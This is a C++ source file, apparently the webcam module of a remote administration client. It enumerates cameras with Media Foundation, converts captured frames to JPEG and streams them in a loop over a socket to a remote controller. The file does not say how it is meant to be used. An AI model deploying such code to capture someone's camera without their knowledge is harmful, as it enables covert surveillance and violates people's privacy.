#include "cliente.hpp"
#include "mod_camara.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

//Conversion functions
int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

BYTE* mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPerPixel, const unsigned long& padding_size, DWORD iBuffersize, unsigned int& iBuffsizeOut) {
    //Liberar buffer retornado
    unsigned long headers_size = sizeof(BITMAPFILEHEADER) +
        sizeof(BITMAPINFOHEADER);

    unsigned long pixel_data_size = lHeight * ((lWidth * (wBitsPerPixel / 8)) + padding_size);

    BITMAPINFOHEADER bmpInfoHeader = { 0 };

    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpInfoHeader.biBitCount = wBitsPerPixel;
    bmpInfoHeader.biClrImportant = 0;
    bmpInfoHeader.biClrUsed = 0;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biHeight = lHeight;
    bmpInfoHeader.biWidth = lWidth;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biSizeImage = pixel_data_size;

    BITMAPFILEHEADER bfh;
    ZeroMemory(&bfh, sizeof(bfh));
    bfh.bfType = 'MB';

    bfh.bfOffBits = headers_size;

    bfh.bfSize = headers_size + pixel_data_size;

    unsigned int uiHeadsize = sizeof(bfh) + sizeof(bmpInfoHeader);
    iBuffsizeOut = uiHeadsize;
    BYTE* nBuffer = new BYTE[uiHeadsize];
    memcpy(nBuffer, &bfh, sizeof(bfh));
    memcpy(nBuffer + sizeof(bfh), &bmpInfoHeader, sizeof(bmpInfoHeader));

    return nBuffer;
}

BYTE* mod_Camera::toJPEG(BYTE*& bmpBuffer, u_int uiBuffersize, u_int& uiOutBufferSize) {
    //Liberar buffer despues de haberse usado
    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    Gdiplus::Image* nImage;
    Gdiplus::Status  stat;
    STATSTG statstg;
    IStream* oStream;
    IStream* nStream;
    CLSID   encoderClsid;
    BYTE* bJPEGbuffer = nullptr;
    ULONG bytesRead;
    u_int uiBuffS = 0;
    int iRet = 0;

    HRESULT hr;

    nStream = SHCreateMemStream(bmpBuffer, uiBuffersize);
    if (!nStream) {
        DebugPrint("[X] SHCreateMemStream error");
        goto release;
    }

    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        DebugPrint("[X] CreateStreamOnHGlobal error");
        goto release;
    }

    nStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

    nImage = Gdiplus::Image::FromStream(nStream);
    if (nImage == nullptr || nImage->GetLastStatus() != Gdiplus::Ok) {
        DebugPrint("[X] Gdiplus::Image::FromStream error");
        goto release;
    }

    
    iRet = this->GetEncoderClsid(L"image/jpeg", &encoderClsid);
    if (iRet == -1) {
        DebugPrint("[X] image/jpeg not found trying PNG...");
        iRet = this->GetEncoderClsid(L"image/png", &encoderClsid);
        if (iRet == -1) {
            DebugPrint("[X] image/png not found bye...");
            goto release;
        }
    }

    stat = nImage->Save(oStream, &encoderClsid, NULL);
    if (stat != Gdiplus::Ok) {
        DebugPrint("[X] nImage->Save");
        goto release;
    }

    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr != S_OK) {
        DebugPrint("[X] oStream->Stat");
        goto release;
    }

    uiBuffS = statstg.cbSize.LowPart; //Asuming is lower than 4G duuuh
    bJPEGbuffer = new BYTE[uiBuffS];

    oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);

    hr = oStream->Read(bJPEGbuffer, uiBuffS, &bytesRead);
    if (hr != S_OK) {
        DebugPrint("[X] oStream->Read");
    }else {
        uiOutBufferSize = bytesRead;
    }


    release:

    oStream->Release();
    nStream->Release();


    if (nImage) {
        delete nImage;
        nImage = nullptr;
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
    GlobalFree(hGlobalMem);

    return bJPEGbuffer;
}

HRESULT mod_Camera::ListCaptureDevices(std::vector<IMFActivate*>& devices)
{
    IMFAttributes* pAttributes = NULL;
    HRESULT hr = MFCreateAttributes(&pAttributes, 1);
    if (SUCCEEDED(hr))
    {
        hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        if (SUCCEEDED(hr))
        {
            UINT32 count = 0;
            IMFActivate** ppDevices = NULL;
            hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
            if (SUCCEEDED(hr))
            {
                for (UINT32 i = 0; i < count; i++){
                    devices.push_back(ppDevices[i]);
                }
                CoTaskMemFree(ppDevices);
            }
        }
        pAttributes->Release();
    }
    return hr;
}

std::vector<std::string> mod_Camera::ListNameCaptureDevices() {
    std::vector<std::string> vcDevices;
    IMFAttributes* pAttributes = NULL;
    HRESULT hr = MFCreateAttributes(&pAttributes, 1);
    if (SUCCEEDED(hr)){
        hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        if (SUCCEEDED(hr)){
            UINT32 count = 0;
            IMFActivate** ppDevices = NULL;
            hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
            if (SUCCEEDED(hr)){
                for (UINT32 i = 0; i < count; i++){
                    WCHAR* szFriendlyName = NULL;
                    UINT32 cchName;

                    hr = ppDevices[i]->GetAllocatedString(
                        MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
                        &szFriendlyName, &cchName);
                    if (SUCCEEDED(hr)){
                        char cBuffer[100];
                        memset(cBuffer, 0, sizeof(cBuffer));

                        size_t iRet;
                        wcstombs_s(&iRet, cBuffer, sizeof(cBuffer), szFriendlyName, sizeof(cBuffer) - 1);
                        vcDevices.push_back(std::string(cBuffer));
                    }

                    //Agregar el dev a la lista interna tambien
                    //this->vcCams.push_back(ppDevices[i]);
                    //this->vcActivated.push_back(false);
                    //this->vcIsLive.push_back(false);

                    //Agregar el source y reader por defecto                    
                    IMFSourceReader* dummyReader = nullptr;
                    IMFMediaSource* dummySource = nullptr;
                    //this->vc_pReader.push_back(dummyReader);
                    //this->vc_pSource.push_back(dummySource);

                    struct camOBJ cam_Temp;
                    cam_Temp.isActivated = cam_Temp.isLive = false;
                    cam_Temp.sActivate = ppDevices[i];
                    cam_Temp.sReader = dummyReader;
                    cam_Temp.sSource = dummySource;

                    this->vcCamObjs.push_back(cam_Temp);
                    
                    CoTaskMemFree(szFriendlyName);
                }

                CoTaskMemFree(ppDevices);
            }
        }
        pAttributes->Release();
    }
    return vcDevices;
}

HRESULT mod_Camera::ConfigureSourceReader(IMFSourceReader*& pReader, int pIndexDev)
{
    // The list of acceptable types.
    GUID subtypes[] = {
        MFVideoFormat_NV12, MFVideoFormat_YUY2, MFVideoFormat_UYVY,
        MFVideoFormat_RGB32, MFVideoFormat_RGB24, MFVideoFormat_IYUV
    };

    HRESULT hr = S_OK;
    BOOL    bUseNativeType = FALSE;

    GUID subtype = { 0 };

    IMFMediaType* pType = NULL;

    // If the source's native format matches any of the formats in 
    // the list, prefer the native format.

    // Note: The camera might support multiple output formats, 
    // including a range of frame dimensions. The application could
    // provide a list to the user and have the user select the
    // camera's output format. That is outside the scope of this
    // sample, however.

    hr = pReader->GetNativeMediaType(
        (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
        0,  // Type index
        &pType
    );

    if (FAILED(hr)) { goto done; }

    hr = pType->GetGUID(MF_MT_SUBTYPE, &subtype);

    if (FAILED(hr)) { goto done; }

    for (UINT32 i = 0; i < ARRAYSIZE(subtypes); i++)
    {
        if (subtype == subtypes[i])
        {
            hr = pReader->SetCurrentMediaType(
                (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                NULL,
                pType
            );

            bUseNativeType = TRUE;
            break;
        }
    }

    if (!bUseNativeType)
    {
        // None of the native types worked. The camera might offer 
        // output a compressed type such as MJPEG or DV.

        // Try adding a decoder.

        for (UINT32 i = 0; i < ARRAYSIZE(subtypes); i++)
        {
            hr = pType->SetGUID(MF_MT_SUBTYPE, subtypes[i]);

            if (FAILED(hr)) { goto done; }

            hr = pReader->SetCurrentMediaType(
                (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                NULL,
                pType
            );

            if (SUCCEEDED(hr))
            {
                break;
            }
        }
    }

    //Obtener resolution de buffer capturado
    hr = MFGetAttributeSize(pType, MF_MT_FRAME_SIZE, &this->vcCamObjs[pIndexDev].width, &this->vcCamObjs[pIndexDev].height);

done:

    SafeRelease(&pType);
    return hr;
}

HRESULT mod_Camera::ConfigureCapture(IMFSourceReader*& pReader, int pIndexDev){
    HRESULT hr = S_OK;
    IMFMediaType* pType = NULL;

    hr = ConfigureSourceReader(pReader, pIndexDev);

    if (SUCCEEDED(hr)){
        hr = pReader->GetCurrentMediaType(
            (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
            &pType
        );
    }

    SafeRelease(&pType);
    return hr;
}

HRESULT mod_Camera::OpenMediaSource(IMFMediaSource*& pSource, IMFSourceReader*& pReader){
    HRESULT hr = S_OK;

    IMFAttributes* pAttributes = NULL;
    
    hr = MFCreateAttributes(&pAttributes, 2);

    if (SUCCEEDED(hr)){
        hr = pAttributes->SetUnknown(MF_SOURCE_READER_ASYNC_CALLBACK, NULL);
    }

    if (SUCCEEDED(hr)) {
        hr = MFCreateSourceReaderFromMediaSource(
            pSource,
            pAttributes,
            &pReader
        );    
    }
    
    SafeRelease(&pAttributes);
    return hr;
}

HRESULT mod_Camera::Init(IMFActivate*& pDevice, int pIndexDev) {
    if (this->vcCamObjs[pIndexDev].isActivated) {
        return S_OK;
    }

    HRESULT hr = S_OK;
    
    //hr = pDevice->ActivateObject(__uuidof(IMFMediaSource), (void**)&this->vc_pSource[pIndexDev]);
    hr = pDevice->ActivateObject(__uuidof(IMFMediaSource), (void**)&this->vcCamObjs[pIndexDev].sSource);

    if (SUCCEEDED(hr)){
        hr = OpenMediaSource(this->vcCamObjs[pIndexDev].sSource, this->vcCamObjs[pIndexDev].sReader);
    }

    if (SUCCEEDED(hr)){
        hr = ConfigureCapture(this->vcCamObjs[pIndexDev].sReader, pIndexDev);
    }

    return hr;
}

BYTE* mod_Camera::GetFrame(int& iBytesOut, int pIndexDev) {
    //Liberar buffer retornado despues de haberse usado
    
    BYTE* cBufferOut = NULL;
    DWORD streamIndex, flags;
    LONGLONG llTimeStamp;
    IMFSample* pSample = NULL;
    HRESULT hr;
    //Hay que hacer un loop hasta que tome el frame
    while (1) {
        //hr = this->vc_pReader[pIndexDev]->ReadSample(
        hr = this->vcCamObjs[pIndexDev].sReader->ReadSample(
            (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
            0,
            &streamIndex, // Receives the actual stream index.
            &flags, // Receives the stream flags.
            &llTimeStamp, // Receives the timestamp.
            &pSample // Receives the sample or NULL.
        );

        if (FAILED(hr)) {
            break;
        }

        if (flags & MF_SOURCE_READERF_ENDOFSTREAM) {
            break;
        }

        if (pSample == NULL) {
            continue;
        }

        //We got a sample
        break;
    }

    if (SUCCEEDED(hr) && pSample != NULL){
        IMFMediaBuffer* pBuffer = NULL;
        hr = pSample->ConvertToContiguousBuffer(&pBuffer);
        if (SUCCEEDED(hr)){
            BYTE* pData = NULL;
            DWORD maxLength = 0, currentLength = 0;

            hr = pBuffer->Lock(&pData, &maxLength, &currentLength);
            if (SUCCEEDED(hr))
            {
                // Unlock the buffer when done.

                unsigned int iOutSize = 0;
                BYTE* bmpHeadBuff = this->bmpHeader(this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height, 24, 0, currentLength, iOutSize);

                cBufferOut = new BYTE[currentLength + iOutSize];
                if (bmpHeadBuff) {
                    memcpy(cBufferOut, bmpHeadBuff, iOutSize);
                    memcpy(cBufferOut + iOutSize, pData, currentLength);
                    delete[] bmpHeadBuff;
                    bmpHeadBuff = nullptr;
                } else {
                    DebugPrint("[X] No se pudo crear la cabecera bmp");
                    delete[] cBufferOut;
                    cBufferOut = nullptr;
                }
                            
                iBytesOut = currentLength + iOutSize;

                pBuffer->Unlock();
            }
            pBuffer->Release();
        }
        pSample->Release();
    }

    return cBufferOut;
}

void mod_Camera::SpawnLive(int pIndexDev) {
    //this->vcCamObjs[pIndexDev].thLive = std::thread(&mod_Camera::LiveCam, this, pIndexDev);
    this->thLive = std::thread(&mod_Camera::LiveCam, this, pIndexDev);
}

void mod_Camera::JoinLiveThread(int pIndexDev) {
    //this->vcIsLive[pIndexDev] = false;
    this->vcCamObjs[pIndexDev].isLive = false;
    /*if (this->vcCamObjs[pIndexDev].thLive.joinable()) {
        this->vcCamObjs[pIndexDev].thLive.join();
    }*/
    if (this->thLive.joinable()) {
        this->thLive.join();
    }
}

void mod_Camera::LiveCam(int pIndexDev) {
    HRESULT hr = S_OK;

    if (!this->vcCamObjs[pIndexDev].isActivated) {
        hr = this->Init(this->vcCamObjs[pIndexDev].sActivate, pIndexDev);
    }

    if (SUCCEEDED(hr)) {
        this->vcCamObjs[pIndexDev].isActivated = true;
        this->vcCamObjs[pIndexDev].isLive = true;

        DebugPrint("[!]Live iniciado");

        std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
        strHeader.append(1, CMD_DEL);
        strHeader += std::to_string(pIndexDev);
        strHeader.append(1, CMD_DEL);

        int iHeaderSize = strHeader.size();

        while (this->vcCamObjs[pIndexDev].isLive) {
            int iBufferSize = 0;
            u_int iJPGBufferSize = 0;
            u_int uiPacketSize = 0;
            BYTE* cBuffer = this->GetFrame(iBufferSize, pIndexDev);
            BYTE* cJPGBuffer = nullptr;
            BYTE* cPacket = nullptr;

            if (cBuffer) {
                cJPGBuffer = this->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
                if (cJPGBuffer) {
                    uiPacketSize = iHeaderSize + iJPGBufferSize;
                    cPacket = new BYTE[uiPacketSize];
                    if (cPacket) {
                        memcpy(cPacket, strHeader.c_str(), iHeaderSize);
                        memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
                        
                        cCliente->cSend(cCliente->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
                        
                        delete[] cPacket;
                        cPacket = nullptr;
                    }
                    delete[] cJPGBuffer;
                    cJPGBuffer = nullptr;
                }
            }

            if (cBuffer) {
                delete[] cBuffer;
                cBuffer = nullptr;
            }
        }
    }
}